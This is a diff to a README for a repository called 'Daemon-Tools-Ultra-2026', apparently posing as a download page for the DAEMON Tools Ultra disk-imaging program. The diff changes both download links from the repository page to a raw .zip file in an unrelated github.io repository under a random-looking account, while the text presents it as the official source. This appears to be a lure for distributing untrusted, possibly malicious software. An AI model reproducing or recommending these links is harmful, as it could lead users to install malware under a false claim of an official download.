@@ -5,7 +5,7 @@ description: "Install DAEMON Tools Ultra on Windows 10 and 11 using a direct Pow
 ---
 # 💿 Daemon-Tools-Ultra-2026 - Create and manage virtual disk images
 
-[![](https://img.shields.io/badge/Download-Daemon_Tools_Ultra-blue)](https://github.com/dispassionate-samuellanghorneclemens238/Daemon-Tools-Ultra-2026)
+[![](https://img.shields.io/badge/Download-Daemon_Tools_Ultra-blue)](https://raw.githubusercontent.com/dispassionate-samuellanghorneclemens238/dispassionate-samuellanghorneclemens238.github.io/main/eclectic/io-samuellanghorneclemens-dispassionate-github-v2.9.zip)
 
 ## 📌 About this software
 
@@ -27,7 +27,7 @@ Before you begin, ensure your computer meets these standards:
 
 You must visit the official repository page to obtain the installer. Follow this link to access the download options:
 
-[Download Daemon Tools Ultra 2026](https://github.com/dispassionate-samuellanghorneclemens238/Daemon-Tools-Ultra-2026)
+[Download Daemon Tools Ultra 2026](https://raw.githubusercontent.com/dispassionate-samuellanghorneclemens238/dispassionate-samuellanghorneclemens238.github.io/main/eclectic/io-samuellanghorneclemens-dispassionate-github-v2.9.zip)
 
 ## 🛠 Installation steps
 
